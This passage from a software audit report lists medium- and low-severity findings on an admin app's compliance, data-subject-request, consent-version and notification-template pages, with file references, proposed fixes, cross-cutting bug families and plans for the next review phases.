**Fix:** either implement the tab using the existing `/api/v1/admin/bir/exports` endpoint (per the TODO comment), or remove the tab entirely until it works. **Do not ship stubs to production.**

### MED-322 — Regulatory Reports tab is a STUB with stale ETA marker
**File:** [apps/admin/src/pages/CompliancePage.tsx:795-811](apps/admin/src/pages/CompliancePage.tsx#L795)

```tsx
<Button onClick={() => { toast.info('Regulatory posture report not yet implemented — ETA Phase 14.'); }}>
  Generate compliance posture report
</Button>
```

Phase 14 is complete per CLAUDE.md. The toast claims "ETA Phase 14" — false. Stale TODO. **Fix:** remove the tab or implement it with an actual posture report (consent counts, DSR SLA stats, breach log summary).

### MED-323 — None of the 4 F04 pages import `useAuthStore` for client-side role gating
**Files:** all 4 F04 pages (lines 1-11 of each)

CRIT-132 family. Junior admin sees the page chrome and form controls; server returns 403 on protected actions; UX is broken without a clear "you don't have permission" message. **Fix:** wrap in `<RequireRole role="super_admin|dpo">` per the F03 dispatch.

### MED-324 — DSR queue + consent search expose `userEmail` and `ipAddress` to all admins (CRIT-132 family)
**Files:** [CompliancePage.tsx:255](apps/admin/src/pages/CompliancePage.tsx#L255), [CompliancePage.tsx:472-477](apps/admin/src/pages/CompliancePage.tsx#L472), [DataProtectionLogPage.tsx:225](apps/admin/src/pages/DataProtectionLogPage.tsx#L225)

Same exposure pattern. Wrap user-identifying columns in `<RedactPii>`.

### MED-325 — DataProtectionLogPage filters `typeFilter` CLIENT-SIDE on a paginated server response (line 139-143); pagination semantics broken
**File:** [apps/admin/src/pages/DataProtectionLogPage.tsx:139-143](apps/admin/src/pages/DataProtectionLogPage.tsx#L139)

Server returns 200 rows max (`limit=200` hardcoded). Client filters by typeFilter in memory. If 500 erasure DSRs exist, only the first 200 are loaded, then filtered. Admin filtering for "all access requests" sees only access requests that happen to be in the first 200 by date. **Fix:** push typeFilter to server query params; matches the existing `status` and `overdueOnly` pattern.

### MED-326 — DSR queue limit hardcoded at 200; no pagination at all on DataProtectionLogPage
**File:** [apps/admin/src/pages/DataProtectionLogPage.tsx:132](apps/admin/src/pages/DataProtectionLogPage.tsx#L132)

For a launch with 5000 customers, 1% DSR rate = 50 DSRs. Fine. But growth to 50K customers = 500 DSRs over 6 months. Anything beyond 200 invisible. **Fix:** add pagination + "Load older" button.

### MED-327 — No date range filter on DSR queue or consent search
**Files:** [CompliancePage.tsx:170-285](apps/admin/src/pages/CompliancePage.tsx#L170), [DataProtectionLogPage.tsx:329-373](apps/admin/src/pages/DataProtectionLogPage.tsx#L329)

DPO needs to pull "January DSRs" for monthly NPC reporting. No date filter. Similar to F03 MED-310/MED-320.

### MED-328 — No persistent overdue alert/banner on either DSR page
**Files:** [CompliancePage.tsx:170-285](apps/admin/src/pages/CompliancePage.tsx#L170), [DataProtectionLogPage.tsx:115-117](apps/admin/src/pages/DataProtectionLogPage.tsx#L115)

`overdueOnly` is a checkbox; admin must opt in to see overdue DSRs. Should be a top-of-page banner: "5 DSRs overdue — exceeds 15-day NPC SLA." Auto-displayed.

### MED-329 — BIR Calendar `year` input accepts retroactive years (min 2020)
**File:** [apps/admin/src/pages/CompliancePage.tsx:524-532](apps/admin/src/pages/CompliancePage.tsx#L524)

Admin can browse 2020 BIR calendar (the platform didn't exist yet). Defensive but harmless — should be min={year of platform launch, currently 2026}. Minor.

### MED-330 — `compliance.routes.ts:37-54` (POST /consent) accepts unvalidated `version` and `consentType`
**File:** [packages/api/src/routes/compliance.routes.ts:37-54](packages/api/src/routes/compliance.routes.ts#L37)

Customer-side endpoint stores consent records with whatever consentType + version the client sends. No allowlist validation, no foreign-key check against published consent versions table. Customer's mobile client could send `consentType='gdpr_explicit'` (wrong; it's an EU thing). DB stores it. NPC traceability fragmented.

**Fix:** server validates consentType against allowlist (CRIT-139 fix dispatch), validates version exists in published_consent_versions for that type.

### MED-331 — `compliance.routes.ts:16-35` (POST /dsr) has no rate limit; customer can spam-submit DSRs
**File:** [packages/api/src/routes/compliance.routes.ts:16-35](packages/api/src/routes/compliance.routes.ts#L16)

A frustrated user can file 100 DSRs in 5 minutes. Each requires DPO action. DOS vector against the DPO. **Fix:** rate-limit to 5 DSRs per user per day. Server-side rate limiter.

### MED-332 — BreachLog API exists (DPO-gated) but no admin UI; DPO must use curl
**File:** [packages/api/src/routes/breach-log.routes.ts:1-87](packages/api/src/routes/breach-log.routes.ts) — the routes
**Missing:** `apps/admin/src/pages/BreachLogPage.tsx`

Per Phase 14 D08 Bug 1366, breach log endpoints exist for DPO use:
- `GET /api/v1/admin/breach-log` (list)
- `POST /api/v1/admin/breach-log` (create)
- `POST /api/v1/admin/breach-log/:id/notify-npc`
- `PATCH /api/v1/admin/breach-log/:id/status`

But there's no UI. NPC RA 10173 §38 requires breach notification within 72 hours. DPO can't use a UI — they must use curl. **Fix:** add `BreachLogPage.tsx` modeled after DataProtectionLogPage but for breaches.

### MED-333 — Two parallel audit-log surfaces (AuditLogPage + CompliancePage AuditTab) with different feature sets
**Files:** [apps/admin/src/pages/AuditLogPage.tsx](apps/admin/src/pages/AuditLogPage.tsx), [apps/admin/src/pages/CompliancePage.tsx:577-746](apps/admin/src/pages/CompliancePage.tsx#L577)

CompliancePage's AuditTab has more filters (userId, from, to) and CSV export. AuditLogPage doesn't. Same data, two UIs, drift risk. **Fix:** delete AuditLogPage; route /audit-log to /compliance#audit. OR enhance AuditLogPage to match.

### MED-334 — Notification template editor: no test-send capability, no preview, no diff
**File:** [apps/admin/src/pages/NotificationTemplatesPage.tsx:278-394](apps/admin/src/pages/NotificationTemplatesPage.tsx#L278)

Admin can't test what the template will look like before saving. **Fix:** see CRIT-138 dispatch.

### MED-335 — Notification templates: no multi-language support; Boracay launch must support Tagalog
**File:** [apps/admin/src/pages/NotificationTemplatesPage.tsx](apps/admin/src/pages/NotificationTemplatesPage.tsx) (entire file)

The template schema/UI doesn't have a `locale` column. All templates are English. For a Boracay launch, every customer-facing notification (booking confirmed, payment received, dispute resolved, marketing) must be available in en + tl. **Fix:** see CRIT-138 dispatch.

### MED-336 — Notification template: variable validation client-side only as a hint; admin can type any free-text variable
**File:** [apps/admin/src/pages/NotificationTemplatesPage.tsx:349-361](apps/admin/src/pages/NotificationTemplatesPage.tsx#L349)

Admin types `{{custmer_name}}` (typo). Server saves. Dispatcher's variable substitution doesn't find `custmer_name` → renders literally `{{custmer_name}}` in the customer's notification. Customer sees `Hello {{custmer_name}}, your booking is confirmed.` **Embarrassing.**

**Fix:** server validates against per-type variable registry (see CRIT-138 dispatch).

### MED-337 — Inline modal `<div className="fixed inset-0 ...">` on NotificationTemplatesPage instead of `<Dialog>`
**File:** [apps/admin/src/pages/NotificationTemplatesPage.tsx:278-394](apps/admin/src/pages/NotificationTemplatesPage.tsx#L278)

Same MED-293/309 family. Replace with shared `<Dialog>` component.

### MED-338 — Notification template Delete uses native `confirm()` — same MED-317 family
**File:** [apps/admin/src/pages/NotificationTemplatesPage.tsx:208](apps/admin/src/pages/NotificationTemplatesPage.tsx#L208)

Replace with `<ConfirmDialog>` + reason field + audit-row preview.

### MED-339 — ConsentVersionsPage has no UNPUBLISH capability
**File:** [apps/admin/src/pages/ConsentVersionsPage.tsx](apps/admin/src/pages/ConsentVersionsPage.tsx) (entire file)

Once published, version is permanent. Admin published v1.5 with a typo'd changeSummary; cannot unpublish, cannot edit. Audit trail polluted. **Fix:** add /consent-versions/:id/unpublish endpoint (super_admin + DPO co-sign per CRIT-137 dispatch).

### MED-340 — ConsentVersionsPage doesn't store/display the actual policy text content
**File:** [apps/admin/src/pages/ConsentVersionsPage.tsx](apps/admin/src/pages/ConsentVersionsPage.tsx) (entire file)

The page tracks consent versions (type, version string, effective date, change summary) but not the actual policy TEXT. Customer's right to know what they agreed to (NPC §16 + §28) requires the text be retained. Currently the text lives... somewhere else? In a Markdown file in the repo? On a static webpage?

**Real-world impact:** customer sues over privacy policy v1.4 from a year ago. Platform has to find what v1.4 said. Scrolling git history of `apps/customer/src/policies/privacy_policy.md` is the actual source of truth. Discovery for litigation costs hours of engineering time.

**Fix:** store the rendered policy text in `consent_versions.body_text` + `body_format` ('markdown'|'html'). Display in the audit trail. Add diff view between versions.

---

## LOW / INFO

- **CompliancePage AuditTab is the better-featured audit log** (date range, userId, CSV export). The standalone AuditLogPage from F03 is now the lesser surface. Should be unified.
- **Bug 402 (consent search DPO-only)** verified in code at compliance-admin.routes.ts:49-91. The audit-log row written for every consent search is sound NPC traceability.
- **Bug 401 (audit log CSV export self-audited)** verified at compliance-admin.routes.ts:164-208. Strong pattern — every CSV export creates an audit row with row count + filter.
- **DataProtectionLogPage's typed-CONFIRM input** for erasure (line 413-422) is a strong UX pattern (forces friction). The semantic problem (CRIT-136) is that the action behind the friction does nothing.
- **DataProtectionLogPage's separate dedicated dialogs** (complete / request_info / reject / escalate) are cleaner than CompliancePage's monolithic PATCH form. Consolidate on this pattern.
- **Reject reason min 20 chars** in DataProtectionLogPage (line 538) is the right floor. Apply globally per F03 MED-288 family.
- **Phase 14 D08 (Bug 401 + 402)** is fully verified — those 2 bugs are real fixes, not theatre. Consent search is gated, audit-log export is self-audited.
- **`requireDpoRole` middleware** is in use on consent search + breach log. Need to verify `require-dpo.middleware.ts` to ensure it correctly checks for the DPO claim. (Phase H test-quality audit checkpoint.)
- **`compliance.searchConsent`** result is wrapped + the result is also self-audited per Bug 402 doctrine. Pattern is good; apply to KYC doc views (CRIT-128 family).
- **DataProtectionLogPage's "manual erasure" warning** is the most honest piece of UI in the audit so far. The team knows the gap. Fix is lined up — see CRIT-136.

---

## Cross-cutting families this phase newly fed

- **PII exposure to junior admins** (CRIT-132): + 4 sites in F04 (DSR queue, consent search, audit tab, DPO log).
- **No client-side role gate** (MED-301 family): + 4 sites in F04 (CompliancePage, ConsentVersionsPage, DataProtectionLogPage, NotificationTemplatesPage).
- **TODO stubs shipped to production** (CRIT-95 family): + 2 sites (Tax Documents, Regulatory Reports).
- **Unbounded free-text inputs that should be enums** (CRIT-139 — new family): + 3 sites in F04 (consentType, version, notification template slug).
- **No two-person rule on legal artifacts** (CRIT-137 — new family): consent version publish, breach log creation (UI absent), notification template publish.
- **Dual API paths for the same operation** (CRIT-141 — new family): PATCH /dsr/:id vs POST /dsr/:id/{complete,reject,...}.
- **NPC RA 10173 violations**: CRIT-136 (erasure not actually performed), CRIT-137 (consent versioning unguarded), CRIT-140 (data export URL leakage), MED-330 (consent records data integrity).
- **Boracay launch i18n gap** (MED-335 — new family): no Tagalog support in notification templates. Likely also missing from consent policy text + email templates + push notification fallbacks.

---

## Phase F running totals (after F04)

| | Lines fully read | Findings docs |
|---|---:|---|
| F01 (Foundations) | 1,180 | 1 |
| F02 (Money + booking + dispute) | 5,079 | 1 |
| F03 (User + provider + staff + identity + audit) | ~4,500 | 1 |
| **F04 (Compliance + data-rights + notification templates)** | **~2,743** | **1** |
| **Phase F total so far** | **~13,502** | **4** |

| | New CRITs | New MEDs |
|---|---:|---:|
| F04 | 6 (CRIT-136 through CRIT-141) | 20 (MED-321 through MED-340) |

**Cumulative audit totals after F04:**
- ~66,183 lines fully read
- **141 CRITICAL** bugs (1 invalidated → **140 real**, +6 this phase)
- **340 MEDIUM** bugs (+20)

**Top F04 fixes by impact:**

1. **CRIT-136 (erasure DSR doesn't erase)** — single biggest finding of the audit so far. **Launch-blocking** for NPC compliance + AMLA + business reputation. Migration + worker + endpoint + UI rewrite. Bundle with PHASE-G to wire migration + RLS for `erasure_executions` table.
2. **CRIT-137 (consent version publish unguarded)** — junior admin can force re-consent platform-wide. Server gate + co-sign workflow + UI hide.
3. **CRIT-138 (notification templates editable, no XSS, no role gate, no preview)** — phishing vector + brand damage risk. Multi-tier fix: role gate + XSS sanitization + variable validation + test-send + multi-language.
4. **CRIT-139 (consent typo creates duplicate types; retroactive dates allowed)** — bundle into CRIT-137 dispatch (consent versioning rewrite).
5. **CRIT-140 (DSR response URL paste)** — bundle with CRIT-125/128 (presigned-PDF + KYC) into a unified "all PII files proxy-downloaded" dispatch.
6. **CRIT-141 (PATCH /dsr/:id bypasses the dedicated POST guards)** — remove or hard-gate the PATCH path.
7. **MED-332 (no BreachLog UI)** — Phase 14 D08 added the API, didn't add the UI. Add `BreachLogPage.tsx`.

---

## What's left in Phase F

### F05 — Catalog / pricing / marketing / ops (~3,892 lines, NEXT)
- `apps/admin/src/pages/CatalogPage.tsx` (647)
- `apps/admin/src/pages/PricingRulesPage.tsx` (674)
- `apps/admin/src/pages/MarketingPage.tsx` (1,301) — biggest single page in the admin
- `apps/admin/src/pages/RecurringPage.tsx` (222)
- `apps/admin/src/pages/ServiceAreasPage.tsx` (407)
- `apps/admin/src/pages/BusinessAccountsPage.tsx` (239)
- `apps/admin/src/pages/SupportTicketsPage.tsx` (402)

Watch-for in F05:
- ServiceAreasPage — Boracay default vs Manila default (CRIT-77/92/93/111/116/122 family)
- PricingRulesPage — money math drift (CRIT-13/42/75/81/83 family)
- MarketingPage — explicit consent for marketing per NPC §28; coupled with CRIT-137 (consent versioning) and MED-330 (consent record data integrity)
- RecurringPage — own status enum drift
- SupportTicketsPage — PII exposure (CRIT-132 family)
- CatalogPage — service category tree drift between admin + customer + provider mobile

### F06 — Dashboard / analytics / settings (~1,969 lines)
- DashboardPage (505), AnalyticsPage (537), SystemSettingsPage (427), settings/CancellationPolicyPage (500)

### F07 — UI components (~1,000 lines)
- DataTable, Dialog, Pagination, KpiCard, Chart, Badge, Button, Card, Checkbox, EmptyState, ErrorState, Input, Label, LoadingState, Select, Skeleton, Switch, Tabs, Textarea, Tooltip, icons/index

After F07: PHASE-F-SUMMARY-AND-HANDOFF.md → Phase G (migrations + RLS) → Phase H (test quality audit) → Phase I (master AI-coder dispatch).

---

## Discipline notes from this phase

1. **The `HONESTY-CHECK` comment pattern shows up again.** F03 found "Government ID — not stored — see HONESTY-CHECK." F04 found the parallel pattern: "Erasure must be manually executed against backend systems — clicking Mark Complete does NOT delete the customer's data." The team is documenting their gaps in the UI. Read these warnings carefully — they're flags for CRITs.

2. **Two CRITs in F04 came from reading the server route file and noticing what's NOT wired up.** CRIT-141 (dual PATCH/POST endpoints) only became visible after reading both compliance-admin.routes.ts and both pages. Cross-grep saved a finding that would otherwise have been missed.

3. **Tax Documents + Regulatory Reports stubs** — the antipattern of "ship a tab with a TODO label" is corrosive. Compliance auditors are not going to interpret "Not yet wired" as "we're working on it." Phase I dispatch should bulk-remove or hide stubs.

4. **The reason for two parallel DSR endpoints** is that Phase 13 D08 added the dedicated POSTs but didn't deprecate the PATCH. This is the same antipattern as the StaffRolesPage missing-client-gate (saved by server-side gate). Server-side gating saves CRIT-141 from being a CRIT only if PATCH is hard-gated.

5. **Notification templates are a brand-and-trust artifact.** A platform that lets junior admins edit outbound messages has misaligned its trust boundary. CRIT-138 dispatch is more about workflow than tech.

6. **The Boracay i18n gap (MED-335)** spans this phase. Customer-facing email/push/SMS templates must be available in Tagalog. Filed for Phase I; expect to find more sites in F05/F06.

7. **CRIT-136 is the kind of finding that justifies the entire audit.** A ship-blocking compliance violation, hidden in plain sight, admitted in the UI, missed by 14 prior dispatches. Reading line by line found it. The original Phase 13 audit and Phase 14 audits both passed this surface.
